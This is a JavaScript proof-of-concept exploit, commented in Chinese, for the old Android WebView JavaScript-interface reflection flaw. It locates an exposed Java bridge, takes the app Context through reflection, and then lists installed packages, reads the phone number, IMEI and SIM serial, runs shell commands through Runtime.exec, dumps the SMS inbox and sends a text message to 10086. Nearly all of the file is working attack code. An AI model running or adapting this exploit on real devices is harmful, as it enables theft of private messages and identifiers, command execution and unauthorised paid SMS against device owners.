//works on old android version

function getContext() {
    var obj, jsInterface, r;
    for (var obj in window) {
        try {
            if ("getClass" in window[ obj ]) {
                try {
                    jsInterface = window[ obj ];
                } catch (e) {}
            }
        } catch (e) {}
    }

    if (!jsInterface) return undefined;
    r = function (jsInterface) {
        this.jsInterface = jsInterface;
        this.loadClass = function (className) {
            return this.jni = this.jsInterface.getClass().getClassLoader().loadClass(className);
        };

        this.jni = this.loadClass("android.webkit.JniUtil");
        var myfield = this.jni.getDeclaredField('sContext');
        myfield.setAccessible(true);
        this.context = myfield.get(this.jni);
    }
    return new r(jsInterface);
}

//绑定Context

var env = getContext();

//获取安装包

pm = env.context.getPackageManager()
document.write(pm.getInstalledPackages(0))

//检查权限

var checkPermission = function (permission) {
    return env.context.getPackageManager().checkPermission(permission, env.context.getPackageName()) == 0;
};

if (checkPermission("android.permission.READ_PHONE_STATE")) {
    var telephonyManager = env.context.getSystemService("phone");
    document.write(telephonyManager.getLine1Number());
    document.write('<br />');
    document.write(telephonyManager.getDeviceId());
    document.write('<br />');
    document.write(telephonyManager.getSimSerialNumber());
    document.write('<br />');

}

//执行命令

var exec = function (commond) {
    var runtimeClass = env.loadClass("java.lang.Runtime");
    var runtime = runtimeClass.getMethod("getRuntime", {}).invoke(null, {});
    var process = runtime.exec(commond);
    var inputStream = process.getInputStream();
    var contents = "";
    var b = inputStream.read();
    var i = 1;
    while (b != -1) {
        var bString = String.fromCharCode(b);
        contents += bString;
        b = inputStream.read();
    }
    return contents;
};

document.write(exec(["sh", "-c", "ls -l /mnt/sdcard/"]));

//查短信

var ub = env.loadClass("android.net.Uri$Builder");

//var uri = ub.newInstance().scheme( "content" ).authority( "com.android.contacts" ).path( "data" ).build();

var uri = ub.newInstance().scheme("content").authority("sms").path("inbox").build();
var contentResolver = env.context.getContentResolver();
var cursor = contentResolver.query(uri, [], "", [], "");
var colcnt = cursor.getColumnCount();
while (cursor.moveToNext()) {
    var t = "";
    for (var i = 0; i < colcnt; i++) {
        var s = cursor.getString(i);
        if (s !== undefined) {
            t += cursor.getColumnName(i) + ":" + s + "," + "<br>";
        }
    }
    document.write(t);
}

//发短信

var target = "10086";
var text = "Hello, message !";
var smsManagerClass = env.loadClass("android.telephony.SmsManager");
var smsManager = smsManagerClass.getMethod("getDefault", {}).invoke(null, {});
smsManager.sendTextMessage(target, null, text, null, null);

